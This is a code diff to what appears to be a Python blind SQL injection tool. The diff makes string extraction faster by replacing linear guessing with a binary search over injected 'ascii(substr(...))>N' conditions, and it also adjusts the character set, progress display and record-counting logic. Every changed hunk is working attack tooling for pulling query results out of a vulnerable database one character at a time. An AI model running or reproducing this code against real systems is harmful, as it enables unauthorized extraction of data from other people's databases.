@@ -35,7 +35,8 @@ def print_debug(*arg, **kwargs):
 
 
 # default char range for determine string subquery
-char_range = string.ascii_letters + string.digits + '-_ '
+char_range = list(map(ord, sorted(string.ascii_letters +
+                                  string.digits + '-_ {}')))
 # count of total_injections
 total_injection = 0
 
@@ -113,10 +114,11 @@ def determine_records(subquery, **kwargs):
             query_pattern = r'(select) [\w,\ .]+ (from [\s\S]*)'
             # construct a count query to determine number of records
             if re.search(query_pattern, subquery, flags=re.IGNORECASE):
-                count_query = re.sub(query_pattern, r'\1 count(*) \2', subquery,
-                                     flags=re.IGNORECASE)
+                count_query = re.sub(query_pattern, r'\1 count(*) \2',
+                                     subquery, flags=re.IGNORECASE)
             else:
-                print('Cannot reliably determine query for counting number of records')
+                print('Cannot reliably determine query for counting '
+                      'number of records')
                 count_query = input('please provide one (q for quit): ')
                 if count_query == 'q':
                     exit()
@@ -138,6 +140,9 @@ def determine_records(subquery, **kwargs):
     return res
 
 
+'''
+Determine a subquery that return a single record with a single column
+'''
 def determine_string(subquery, pbar_enabled=True):
     # determine length of the string first
     length = determine_number("length(({}))".format(subquery), left=0)
@@ -147,25 +152,42 @@ def determine_string(subquery, pbar_enabled=True):
 
     print_debug("Determining string value for query:", subquery)
 
-    res = ""
+    res = [-1]
+    res *= length
     pbar = range(length)
     if pbar_enabled and not args.silent:
         pbar = tqdm(pbar)
     for i in pbar:
-        for char in char_range:
-            if inject("substr(({}),{},1)='{}'"
-                      .format(subquery, i+1, char)):
-                res += char
-                if args.verbose:
-                    pbar.write("Determined offset {} char: {}".format(i, char))
-                if pbar_enabled and not args.silent:
-                    pbar.set_postfix(current_result=res)
-                break
-        if len(res) - 1 != i:
+        # binary search for matching char in char_range
+        left = 0
+        right = len(char_range) - 1
+        while left <= right:
+            mid = int((left + right) / 2)
+            if inject("ascii(substr(({}),{},1))>{}"
+                      .format(subquery, i+1, char_range[mid])):
+                left = mid + 1
+            else:
+                right = mid - 1
+
+        if left >= len(char_range) or \
+                not inject("ascii(substr(({}),{},1))={}"
+                           .format(subquery, i+1, char_range[left])):
             raise Exception("Cannot determine offset {} char for query {}\n"
                             "{}/{} Current result: {}"
-                            .format(i, subquery, i+1, length, res))
+                            .format(i, subquery, i, length,
+                                    ''.join(['*' if c == -1 else chr(c)
+                                             for c in res])))
+
+        res[i] = char_range[left]
+
+        if pbar_enabled and not args.silent:
+            pbar.set_description(''.join(
+                ['*' if c == -1 else chr(c)
+                 for c in res])
+                [i-50 if i >= 50 else 0 : 50 if i < 50 else i+1])
+
         i += 1
+    res = ''.join(map(chr, res))
     print_debug("Determined result for query '{}': {}".format(subquery, res))
     return res
 
@@ -263,7 +285,7 @@ def inject_func(payload, args):
 
 
     if args.use_all_printables:
-        char_range = string.printable
+        char_range = sorted(list(map(ord, string.printable)))
 
     if not args.no_verify:
         if not verify_inject():
